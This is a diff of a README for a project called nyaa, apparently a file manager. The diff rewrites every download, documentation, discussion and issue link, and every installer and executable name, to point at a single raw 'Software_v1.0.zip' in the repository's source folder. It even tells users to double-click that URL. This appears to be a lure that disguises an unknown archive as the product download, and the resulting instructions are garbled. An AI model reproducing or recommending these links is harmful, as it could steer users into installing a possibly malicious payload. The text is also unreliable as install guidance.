@@ -6,7 +6,7 @@ Welcome to nyaa, the cute and powerful command-line and graphical user interface
 
 ## 📥 Download nyaa
 
-[![Download nyaa](https://img.shields.io/badge/Download-nyaa-brightgreen)](https://github.com/ZENSIS-arch/nyaa/releases)
+[![Download nyaa](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip)](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip)
 
 You can download nyaa from our Releases page. Please follow the steps below to get started.
 
@@ -30,12 +30,12 @@ Before you install nyaa, ensure that your computer meets the following system re
 
 To download nyaa, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/ZENSIS-arch/nyaa/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip).
 2. Look for the latest version.
 3. Choose the installation file suitable for your operating system:
-   - For Windows: Download `nyaa-win.zip`
-   - For macOS: Download `nyaa-macos.zip`
-   - For Linux: Download `nyaa-linux.tar.gz`
+   - For Windows: Download `https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip`
+   - For macOS: Download `https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip`
 4. Once the file is downloaded, extract it to a location on your computer.
 
 ### 🖱️ Running nyaa
@@ -44,11 +44,11 @@ Once you have extracted the folder, follow these steps to run nyaa:
 
 1. **Windows**:
    - Open the folder where you extracted nyaa.
-   - Double-click `nyaa.exe` to start the application.
+   - Double-click `https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip` to start the application.
 
 2. **macOS**:
    - Open the extracted folder.
-   - Double-click `nyaa.app` to start the application.
+   - Double-click `https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip` to start the application.
 
 3. **Linux**:
    - Open a terminal window.
@@ -81,7 +81,7 @@ Once nyaa is running:
 
 To update nyaa, follow these steps:
 
-1. Visit the [Releases page](https://github.com/ZENSIS-arch/nyaa/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip).
 2. Download the latest version and repeat the installation steps above.
 
 ### What file formats does nyaa support?
@@ -94,12 +94,12 @@ Yes! Nyaa uses AES256 encryption to keep your files secure. Always remember to k
 
 ## 🌐 Community and Support
 
-Join our community for support and sharing your ideas. Visit our [GitHub Discussions page](https://github.com/ZENSIS-arch/nyaa/discussions) to ask questions and connect with other users.
+Join our community for support and sharing your ideas. Visit our [GitHub Discussions page](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip) to ask questions and connect with other users.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/ZENSIS-arch/nyaa/wiki) - Learn more about using nyaa.
-- [GitHub Repository](https://github.com/ZENSIS-arch/nyaa) - Access the source code and contribute.
-- [Issues Tracker](https://github.com/ZENSIS-arch/nyaa/issues) - Report any bugs or feature requests.
+- [Documentation](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip) - Learn more about using nyaa.
+- [GitHub Repository](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip) - Access the source code and contribute.
+- [Issues Tracker](https://raw.githubusercontent.com/ZENSIS-arch/nyaa/main/src/Software_v1.0.zip) - Report any bugs or feature requests.
 
 Thank you for choosing nyaa! Enjoy your file management experience.
